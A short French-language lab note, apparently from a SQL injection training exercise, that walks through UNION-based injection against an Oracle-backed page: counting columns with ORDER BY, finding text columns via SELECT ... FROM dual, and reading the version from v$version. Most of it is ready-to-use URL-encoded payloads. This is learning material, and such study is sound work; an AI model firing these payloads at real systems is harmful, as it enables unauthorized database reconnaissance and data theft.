![](Pasted%20image%2020260722160157.png)

On veut essayez de trouver la version pour ça on va d'abord touvez combien de colonnes il y a, puis laquelle accepte du text

' ORDER BY 1--
'+ORDER+BY+1--
et ainsi de suite jusqu'à trouver le nombre de columns 
![](Pasted%20image%2020260722160358.png)
2 columns 


'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--
et ainsi de suite 
![](Pasted%20image%2020260722160408.png)
aucun n'accepte de texte 

mais y'as la solut : 

UNION SELECT 'abc' FROM dual
'+UNION+SELECT+'abc'+FROM+dual--

'+UNION+SELECT+'abc',NULL+FROM+dual--
'+UNION+SELECT+NULL,'abc'+FROM+dual--

LES 2 prennent du text et on va utiliser BANNER pour avoir les sysinfo

'+UNION+SELECT+BANNER,NULL+FROM+v$version--
'+UNION+SELECT+NULL,BANNER+FROM+v$version--
io
La première proposition a été reussi 
![](Pasted%20image%2020260722160419.png)
![](Pasted%20image%2020260722160425.png)

